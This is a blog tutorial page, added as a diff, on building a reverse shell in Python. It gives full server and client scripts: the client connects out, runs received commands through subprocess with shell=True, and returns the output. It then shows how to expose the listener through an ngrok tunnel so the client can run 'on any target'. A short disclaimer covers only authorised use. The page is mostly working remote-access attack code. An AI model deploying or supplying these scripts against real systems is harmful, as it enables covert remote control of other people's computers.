@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>  A reverse shell with Python | axju
+</title>
+        <meta name="author" content="Axel Juraske" />
+        <meta name="keywords" content="security,linux,hacking,shell,sockets" />
+        <meta name="description" content="I&#39;ll show you how to create a reverse shell using Python and how to make the server public using ngrok" />
+  <link rel="canonical" href="https://axju.github.io/posts/2021/02/a-reverse-shell-with-python/index.html">
+
+
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/fontawesome.min.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/pygments/native.min.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/theme.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/main.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/purecookie.css" async />
+  <script src="https://axju.github.io/theme/js/purecookie.js" async></script>
+
+  <link rel="alternate" type="application/atom+xml" title="Full Atom Feed"
+        href="https://axju.github.io/feeds/all.atom.xml">
+  <link rel="alternate" type="application/atom+xml" title="Categories Atom Feed"
+        href="https://axju.github.io/feeds/security.atom.xml">  <script async src="https://www.googletagmanager.com/gtag/js?id=G-W0RC1HYD7Y"></script>
+  <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W0RC1HYD7Y');
+  </script>
+
+
+</head>
+
+<body>
+<a href="https://github.com/axju">
+<img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_red_aa0000.png" alt="Fork me on GitHub" />
+</a>
+  <header class="header">
+    <div class="container">
+<div class="row">
+    <div class="col-sm-4">
+      <a href="https://axju.github.io/">
+        <img class="img-fluid rounded" src=https://axju.github.io/images/logo.png alt="axju">
+      </a>
+    </div>
+  <div class="col-sm-8">
+    <h1 class="title"><a href="https://axju.github.io/">axju</a></h1>
+      <p class="text-muted">Just coding stuff</p>
+      <ul class="list-inline">
+            <li class="list-inline-item"><a href="https://axju.github.io/pages/projects/">Projects</a></li>
+            <li class=" list-inline-item text-muted">|</li>
+          <li class="list-inline-item"><a class="fab fa-github" href="https://github.com/axju" target="_blank"></a></li>
+          <li class="list-inline-item"><a class="fab fa-youtube" href="https://www.youtube.com/channel/UCFFrfCiHAh0gaQvGZBYMsuA" target="_blank"></a></li>
+          <li class="list-inline-item"><a class="fab fa-instagram" href="https://www.instagram.com/axju.py/" target="_blank"></a></li>
+          <li class="list-inline-item"><a class="fab fa-twitter" href="https://twitter.com/0xAxJu" target="_blank"></a></li>
+      </ul>
+  </div>
+</div>    </div>
+  </header>
+
+  <div class="main">
+    <div class="container">
+      <h1>  A reverse shell with Python
+</h1>
+      <hr>
+  <article class="article">
+    <header>
+      <ul class="list-inline">
+        <li class="list-inline-item text-muted" title="2021-02-19T19:00:00+01:00">
+          <i class="fas fa-clock"></i>
+          Fri 19 February 2021
+        </li>
+        <li class="list-inline-item">
+          <i class="fas fa-folder-open"></i>
+          <a href="https://axju.github.io/category/security.html">security</a>
+        </li>
+          <li class="list-inline-item">
+            <i class="fas fa-tag"></i>
+              <a href="https://axju.github.io/tag/security.html">#security</a>,               <a href="https://axju.github.io/tag/linux.html">#linux</a>,               <a href="https://axju.github.io/tag/hacking.html">#hacking</a>,               <a href="https://axju.github.io/tag/shell.html">#shell</a>,               <a href="https://axju.github.io/tag/sockets.html">#sockets</a>          </li>
+      </ul>
+    </header>
+    <div class="content">
+      <p><strong>Disclaimer</strong>: The described methods should only be used for systems which you
+have access rights. I used this method to get access to my mums PC, which I was
+allowed. And yes, I'm 31, have my own family, but still help my mom with her PC.</p>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/reverse-shell-003.gif" style="width: 100%;" />
+<div class="section" id="some-basics">
+<h2>Some basics</h2>
+<p>What is a reverse shell? With a reverse shell, the target makes the connection.
+On your client is run a server program, which listening for incoming
+connections. And the target execute a program, which connect to your client.
+Then you can run commands on the target from your client. My research:</p>
+<blockquote>
+<ul class="simple">
+<li><a class="reference external" href="https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/">Acunetix</a></li>
+<li><a class="reference external" href="https://www.thepythoncode.com/article/create-reverse-shell-python">PythonCode</a></li>
+<li><a class="reference external" href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">netsparker</a></li>
+</ul>
+</blockquote>
+</div>
+<div class="section" id="python">
+<h2>Python</h2>
+<p>We will write two small Python scripts one for the server and one for the
+client. The only modules we use are
+<a class="reference external" href="https://docs.python.org/3/library/socket.html">sockets</a> and the
+<a class="reference external" href="https://docs.python.org/3/library/subprocess.html">subprocess</a>. Make sure you
+have read the documentation. The programs are short and self-explanatory,
+nothing complicated just a little loop.</p>
+<div class="section" id="server">
+<h3>Server</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">5555</span>
+
+<span class="c1"># set up the socket so that it waits for an incoming connection</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] listening as </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="c1"># waiting for the target and sent a welcome message if it connected</span>
+<span class="n">client_s</span><span class="p">,</span> <span class="n">client_addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] client connected </span><span class="si">{</span><span class="n">client_addr</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">client_s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;welcome&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1"># this loop will run, until you enter &#39;quit&#39;</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+
+    <span class="c1"># 1. enter the command and send it to the target</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">client_s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="c1"># check if you want to quit</span>
+    <span class="k">if</span> <span class="n">cmd</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;quit&#39;</span><span class="p">:</span>
+        <span class="k">break</span>
+
+    <span class="c1"># get the result of the command, executed on the target pc</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client_s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="n">client_s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+</div>
+<div class="section" id="client">
+<h3>Client</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">5555</span>
+
+<span class="c1"># set up the socket and connect to the server</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+
+<span class="c1"># get the welcome message</span>
+<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] server:&#39;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
+
+<span class="c1"># this loop will run until it receive &#39;quit&#39;</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+
+    <span class="c1"># receive the command and print it</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] receive </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="c1"># check if you want to quit</span>
+    <span class="k">if</span> <span class="n">cmd</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;quit&#39;</span><span class="p">:</span>
+        <span class="k">break</span>
+
+    <span class="c1"># now run the command and get the result.</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+    <span class="c1"># if the command has no output, send &#39;ok&#39; so the server knows everything is okay</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;OK&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+    <span class="c1"># send teh result to the server</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="how-to-run">
+<h2>How to run</h2>
+<p>We only uses the Python Standard Library, so we don't have to install anything.
+Simple execute</p>
+<div class="highlight"><pre><span></span>python3 server.py
+</pre></div>
+<p>and</p>
+<div class="highlight"><pre><span></span>python3 client.py
+</pre></div>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/reverse-shell-001.gif" style="width: 100%;" />
+<p>The server run with <em>HOST=0.0.0.0</em> so that it listen on all incoming connection.
+On some examples you read something like <em>HOST=localhost</em> or <em>HOST=127.0.0.1</em>.
+But then it's only listen on connection from the <em>localhost</em>. You shouldn't
+change the <em>HOST</em> of the server script. But if you run the client on another PC,
+you have to enter the IP address of the server for the <em>HOST</em>. You get a problem
+if the PC is not in your local network. Of course you can forward the port in
+your router and then specify your public IP as <em>HOST</em>. But I want to show you
+another way.</p>
+</div>
+<div class="section" id="ngrok">
+<h2>ngrok</h2>
+<p>ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to
+a locally running web service. Simply put, with ngrok you can make any local
+service public. And we will make our server public. Go to
+<a class="reference external" href="https://ngrok.com">ngrok</a> sign up and follow the setup tutorial for your
+system. For me it's</p>
+<blockquote>
+<ol class="arabic">
+<li><p class="first">download</p>
+<div class="highlight"><pre><span></span>wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+</pre></div>
+</li>
+<li><p class="first">unzip</p>
+<div class="highlight"><pre><span></span>unzip ngrok-stable-linux-amd64.zip
+</pre></div>
+</li>
+<li><p class="first">connect your account</p>
+<div class="highlight"><pre><span></span>./ngrok authtoken 1WeW...
+</pre></div>
+</li>
+<li><p class="first">exposed the server</p>
+<div class="highlight"><pre><span></span>./ngrok tcp <span class="m">5555</span>
+</pre></div>
+</li>
+</ol>
+</blockquote>
+<p>Now you are ready to run the client on any target, but you have to change the
+<em>HOST</em> and <em>PORT</em> to the values from ngrok. For my example that will be</p>
+<div class="highlight"><pre><span></span><span class="o">...</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;4.tcp.ngrok.io&#39;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">12050</span>
+<span class="o">....</span>
+</pre></div>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/reverse-shell-002.png" style="width: 100%;" />
+</div>
+<div class="section" id="conclusion">
+<h2>Conclusion</h2>
+<p>As you can see, it's not that complicated to create your own reverse shell and
+make it public. I know, there's a lot of space to improve this script. But for a
+really Simple example they are quite good enough.</p>
+</div>
+
+    </div>
+  </article>
+  <hr>
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function() {
+      this.page.url = 'https://axju.github.io/posts/2021/02/a-reverse-shell-with-python/index.html';
+      this.page.identifier = 'a-reverse-shell-with-python';
+    };
+    (function() {
+      var d = document;
+      var s = d.createElement('script');
+      s.src = '//axju.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript class="text-muted">
+    Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+  </noscript>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="container">
+<div class="row">
+  <ul class="col-sm-6 list-inline">
+    <li class="list-inline-item"><a href="https://axju.github.io/archives.html">Archives</a></li>
+    <li class="list-inline-item"><a href="https://axju.github.io/categories.html">Categories</a></li>
+      <li class="list-inline-item"><a href="https://axju.github.io/tags.html">Tags</a></li>
+
+      <li class=" list-inline-item text-muted">|</li>
+    <li class="list-inline-item"><a class="fas fa-rss" href="https://axju.github.io/feeds/all.atom.xml" target="_blank"></a></li>
+  </ul>
+  <p class="col-sm-6 text-sm-right text-muted">
+    Last update: 2021-08-02
+  </p>
+</div>    </div>
+  </footer>
+
+</body>
+
+</html>
